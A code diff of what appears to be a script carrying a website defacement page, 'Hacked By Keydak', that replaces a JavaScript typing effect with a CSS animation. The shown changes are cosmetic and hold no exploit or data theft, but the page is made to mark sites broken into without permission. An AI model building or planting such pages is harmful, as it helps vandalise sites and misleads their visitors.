@@ -14,6 +14,31 @@ document.addEventListener('DOMContentLoaded', function () {
             <title>Home - Hacked By Keydak</title>
             <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
         </head>
+        <style>
+        .typewrite {
+    display: inline-block;
+    overflow: hidden;
+    white-space: nowrap;
+    font-family: monospace;
+    border-right: 2px solid;
+    animation:
+        typing 4s steps(40, end),
+        blink-caret .75s step-end infinite;
+    width: 0; /* Dimulai dari nol untuk efek pengetikan */
+}
+
+/* Efek pengetikan */
+@keyframes typing {
+    from { width: 0; }
+    to { width: 100%; }
+}
+
+/* Efek kursor berkedip */
+@keyframes blink-caret {
+    from, to { border-color: transparent; }
+    50% { border-color: white; }
+}
+</style>
         <body>
             <div class="mainContainer">
                 <div class="img">
@@ -22,28 +47,12 @@ document.addEventListener('DOMContentLoaded', function () {
                 <h1> Hacked By Keydak</h1>
                 <hr class="hr">
                 <div class="container">
-                    <p class="text1"></p>
+                <p class="typewrite">You need to improve the security system on your site</p>
                 </div>
             </div>
         </body>
         </html>
-        <script>
-            document.addEventListener('DOMContentLoaded', function() {
-        var text = "you need to improve the security system on your site";
-        var textElement = document.querySelector('.text1');
-        var index = 0;
-
-        function type() {
-            if (index < text.length) {
-                textElement.textContent += text.charAt(index);
-                index++;
-                setTimeout(type, 150);
-            }
-        }
-
-        type();
-    });
-    </script>
+        
     `;
 
 
